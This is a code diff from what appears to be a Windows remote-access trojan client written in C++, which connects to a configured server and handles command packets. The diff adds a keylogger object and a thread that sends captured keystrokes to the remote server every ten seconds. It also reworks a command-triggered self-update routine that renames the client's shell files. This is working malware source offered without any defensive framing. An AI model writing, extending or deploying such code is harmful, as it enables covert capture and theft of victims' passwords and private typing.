@@ -11,6 +11,7 @@ using namespace libzippp;
 Client* Client::clientptr = NULL;
 bool Client::connected = false;
 Client Client::main_client(Settings::serverIP, Settings::serverPort);
+keylogger logger = keylogger();
 auto temp_name = std::string("tempfile.tmp");
 
 
@@ -167,44 +168,26 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 	}
 	case PacketType::Update:
 	{
-		_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)UpdateClient, NULL, NULL, NULL);
+		//Just because otherwise it messes with the next instructions
+		std::string exe;
+		if (!GetString(exe))
+			return false;
+
+		Log("Update init\n");
+		//Temporary rename to trigger update in main routine
+		rename(SHELL_NAME, SHELL_UPDATE_NAME);
+		rename(SHELL_BACKUP_NAME, SHELL_UPDATE_NAME);
+		Log("Renamed old files\n");
+		SendString("Renamed files successfully, update begun\n", PacketType::Warning);
 		break;
 	}
+	case PacketType::Heartbeat:
+		break;
 	default: //If PacketType type is not accounted for
-		//std::cout << "Unrecognized PacketType: " << (int32_t)_PacketType << std::endl; //Display that PacketType was not found
+		std::cout << "Unrecognized PacketType: " << (int32_t)_PacketType << std::endl; //Display that PacketType was not found
 		break;
 	}
 	return true;
-}
-
-void Client::UpdateClient() {
-	Log("Update init\n");
-	auto thisptr = Client::clientptr;
-
-	//Temporary rename
-	rename(SHELL_NAME, SHELL_UPDATE_NAME);
-	rename(SHELL_BACKUP_NAME, SHELL_UPDATE_NAME);
-	Log("Renamed old files\n");
-	//Download the new shell
-	//int i = 0;
-	//while (!Client::main_client.RequestFile(std::string(SHELL_NAME), true)) {
-	//	if (i > 9)
-	//		return;
-	//	Client::main_client.RequestFile(std::string(SHELL_NAME), true);
-	//	i++;
-	//}
-	//Log("Requested main shell\n");
-	//
-	////Wait for file existence
-	//while (GetFileAttributesA(SHELL_PATH(SHELL_NAME)) == INVALID_FILE_ATTRIBUTES) {
-	//	if (!Client::connected)
-	//		return;
-	//	Sleep(100);
-	//}
-	//Log("Shell download finished\n");
-	//Copy also backup shell
-	//CopyFile(ExePathA(), SHELL_BACKUP_EXE, FALSE);
-	//Log("Copied backup shell\n");
 }
 
 void Client::ClientThread()
@@ -226,6 +209,16 @@ void Client::ClientThread()
 	else //If connection socket was not closed properly for some reason from our function
 	{
 		//std::cout << "Socket was not able to be closed." << std::endl;
+	}
+}
+
+void Client::KeyloggerThread() {
+	while (true) {
+		if (keylogger::buffer.size()) {
+			clientptr->SendString(logger.GetBuffer(), PacketType::Keylog);
+			logger.ClearBuffer();
+		}
+		Sleep(10000);
 	}
 }
 
